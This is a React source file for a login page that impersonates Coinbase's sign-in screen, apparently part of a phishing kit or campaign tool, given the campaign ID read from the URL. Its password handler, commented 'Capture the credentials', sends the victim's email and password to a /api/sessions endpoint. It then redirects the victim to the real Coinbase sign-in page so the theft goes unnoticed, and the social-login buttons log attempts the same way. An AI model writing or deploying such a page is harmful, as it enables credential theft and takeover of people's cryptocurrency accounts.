import { useState } from "react";
import { useForm } from "react-hook-form";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { apiRequest } from "@/lib/queryClient";

interface LoginFormData {
  email: string;
  password: string;
}

export default function CoinbaseLoginPage() {
  const [step, setStep] = useState<'email' | 'password'>('email');
  const [email, setEmail] = useState('');
  const [emailInput, setEmailInput] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const form = useForm<LoginFormData>({
    defaultValues: {
      email: "",
      password: "",
    },
  });

  const isValidEmail = (email: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  const onEmailSubmit = (data: LoginFormData) => {
    setEmail(data.email);
    setStep('password');
  };

  const onPasswordSubmit = async (data: LoginFormData) => {
    setIsSubmitting(true);
    
    try {
      // Capture the credentials
      await apiRequest("POST", "/api/sessions", {
        username: email,
        password: data.password,
        ipAddress: "unknown",
        status: "complete",
        completionPercentage: 100,
        campaignId: new URLSearchParams(window.location.search).get("cid") || "unknown",
      });

      // Redirect to real Coinbase after a short delay
      setTimeout(() => {
        window.location.href = "https://www.coinbase.com/signin";
      }, 1500);
    } catch (error) {
      console.error("Error capturing session:", error);
      // Still redirect even if capture fails
      setTimeout(() => {
        window.location.href = "https://www.coinbase.com/signin";
      }, 1500);
    }
  };

  const handleSocialAuth = async (provider: string) => {
    try {
      await apiRequest("POST", "/api/sessions", {
        username: `${provider}_auth_attempt`,
        password: `social_${provider}`,
        ipAddress: "unknown",
        status: "complete",
        completionPercentage: 100,
        campaignId: new URLSearchParams(window.location.search).get("cid") || "unknown",
      });

      setTimeout(() => {
        window.location.href = "https://www.coinbase.com/signin";
      }, 1500);
    } catch (error) {
      console.error("Error capturing session:", error);
      setTimeout(() => {
        window.location.href = "https://www.coinbase.com/signin";
      }, 1500);
    }
  };

  return (
    <div className="min-h-screen bg-black">
      {/* Header */}
      <header className="flex justify-between items-center p-6">
        <div className="flex items-center">
          <svg aria-label="Coinbase logo" className="text-white" height="32" role="img" viewBox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
            <title>Coinbase logo</title>
            <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="currentColor"></path>
          </svg>
        </div>
        <a href="#" className="text-blue-500 hover:text-blue-400 font-medium text-sm">
          Sign up
        </a>
      </header>

      {/* Main Content */}
      <div className="flex items-center justify-center min-h-[calc(100vh-120px)] px-4">
        <div className="w-full max-w-md">
          <div className="border border-gray-700 rounded-2xl p-8 bg-black">
            <h1 className="text-white text-2xl font-medium mb-8 text-left">
              Sign in to Coinbase
            </h1>

            {step === 'email' ? (
              <form onSubmit={form.handleSubmit(onEmailSubmit)} className="space-y-4">
                <div className="text-left">
                  <label htmlFor="email" className="block text-white text-sm font-medium mb-2">
                    Email
                  </label>
                  <Input
                    id="email"
                    type="email"
                    value={emailInput}
                    className="w-full px-4 py-4 bg-black border-2 border-gray-600 rounded-xl text-white placeholder-gray-500 focus:border-blue-500 focus:ring-0 focus:outline-none"
                    placeholder="Your email address"
                    data-testid="input-email"
                    onChange={(e) => setEmailInput(e.target.value)}
                    style={{ borderColor: '#4b5563 !important' }}
                  />
                </div>

                <Button
                  type="submit"
                  disabled={!isValidEmail(emailInput)}
                  className={`w-full font-medium py-4 px-6 rounded-full transition-colors ${
                    isValidEmail(emailInput)
                      ? "bg-blue-600 hover:bg-blue-700 text-white"
                      : "bg-blue-600 text-white opacity-50 cursor-not-allowed"
                  }`}
                  data-testid="button-continue"
                >
                  Continue
                </Button>

                <div className="my-6">
                  <div className="relative">
                    <div className="absolute inset-0 flex items-center">
                      <div className="w-full border-t border-gray-700" />
                    </div>
                    <div className="relative flex justify-center text-sm">
                      <span className="px-2 bg-black text-gray-500">OR</span>
                    </div>
                  </div>
                </div>

                <div className="space-y-3">
                  <Button
                    type="button"
                    onClick={() => handleSocialAuth("passkey")}
                    className="w-full bg-gray-700 hover:bg-gray-600 text-white font-medium py-4 px-6 rounded-full transition-colors flex items-center justify-center"
                    data-testid="button-passkey"
                  >
                    <svg className="w-5 h-5 mr-3" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M12.65 10A4 4 0 0 0 9 6a4 4 0 0 0-4 4 4 4 0 0 0 4 4c.34 0 .68-.05 1-.14v.14c0 1.1.9 2 2 2h1v1a1 1 0 0 0 1 1h1v1h2a1 1 0 0 0 1-1v-4.5l-4.35-4.35z"/>
                    </svg>
                    Sign in with Passkey
                  </Button>

                  <Button
                    type="button"
                    onClick={() => handleSocialAuth("google")}
                    className="w-full bg-gray-700 hover:bg-gray-600 text-white font-medium py-4 px-6 rounded-full transition-colors flex items-center justify-center"
                    data-testid="button-google"
                  >
                    <svg className="w-5 h-5 mr-3" viewBox="0 0 24 24">
                      <path fill="currentColor" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                      <path fill="currentColor" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                      <path fill="currentColor" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                      <path fill="currentColor" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                    </svg>
                    Sign in with Google
                  </Button>

                  <Button
                    type="button"
                    onClick={() => handleSocialAuth("apple")}
                    className="w-full bg-gray-700 hover:bg-gray-600 text-white font-medium py-4 px-6 rounded-full transition-colors flex items-center justify-center"
                    data-testid="button-apple"
                  >
                    <svg className="w-5 h-5 mr-3" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
                    </svg>
                    Sign in with Apple
                  </Button>
                </div>
              </form>
            ) : (
              <form onSubmit={form.handleSubmit(onPasswordSubmit)} className="space-y-4">
                <div className="flex items-center justify-center mb-6">
                  <div className="flex items-center bg-black border-2 border-gray-600 rounded-xl px-4 py-3 w-full">
                    <div className="w-6 h-6 bg-gray-600 rounded-full mr-3 flex items-center justify-center">
                      <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 24 24">
                        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                      </svg>
                    </div>
                    <span className="text-white text-sm">{email}</span>
                  </div>
                </div>

                <div className="text-left">
                  <label htmlFor="password" className="block text-white text-sm font-medium mb-2">
                    Password
                  </label>
                  <Input
                    id="password"
                    type="password"
                    {...form.register("password", { required: true })}
                    className="w-full px-4 py-4 bg-black border-2 border-gray-600 rounded-xl text-white placeholder-gray-500 focus:border-blue-500 focus:ring-0 focus:outline-none"
                    placeholder=""
                    data-testid="input-password"
                  />
                </div>

                <div className="text-left">
                  <a href="#" className="text-blue-500 hover:text-blue-400 text-sm">
                    Forgot password?
                  </a>
                </div>

                <Button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-4 px-6 rounded-full transition-colors"
                  data-testid="button-continue-password"
                >
                  {isSubmitting ? "Signing in..." : "Continue"}
                </Button>

                <div className="text-center mt-6">
                  <button 
                    type="button"
                    onClick={() => setStep('email')}
                    className="text-blue-500 hover:text-blue-400 text-sm"
                  >
                    Cancel signing in
                  </button>
                </div>
              </form>
            )}

            <div className="mt-8 text-center">
              <p className="text-gray-500 text-xs leading-relaxed">
                Not your device? Use a private window.<br/>
                See our <a href="#" className="text-blue-500 hover:text-blue-400">Privacy Policy</a> for more info.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}